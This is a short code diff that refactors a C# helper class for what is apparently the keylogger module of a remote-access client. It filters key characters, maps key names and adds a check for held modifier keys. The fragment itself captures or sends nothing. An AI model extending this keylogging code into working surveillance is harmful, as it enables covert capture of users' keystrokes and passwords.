@@ -1,10 +1,13 @@
-﻿using System.Text;
+﻿using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
 
 namespace xClient.Core.Keylogger
 {
-    public class LoggerHelper
+    public static class LoggerHelper
     {
-        public static string Filter(char key)
+        public static string Filter(this char key)
         {
             if ((int)key < 32) return string.Empty;
 
@@ -27,7 +30,7 @@ namespace xClient.Core.Keylogger
             }
             return key.ToString();
         }
-        
+
         public static string GetDisplayName(string key)
         {
             if (key.Contains("ControlKey"))
@@ -51,6 +54,16 @@ namespace xClient.Core.Keylogger
             string title = sbTitle.ToString();
 
             return (!string.IsNullOrEmpty(title)) ? title : null;
+        }
+
+        public static bool HasSetModifierKeys(this List<Keys> KeyCollection)
+        {
+            return KeyCollection.Any(KeyItem => (KeyItem == Keys.LControlKey) ||
+                                                (KeyItem == Keys.RControlKey) ||
+                                                (KeyItem == Keys.LMenu) ||
+                                                (KeyItem == Keys.RMenu) ||
+                                                (KeyItem == Keys.LWin) ||
+                                                (KeyItem == Keys.RWin));
         }
     }
 }
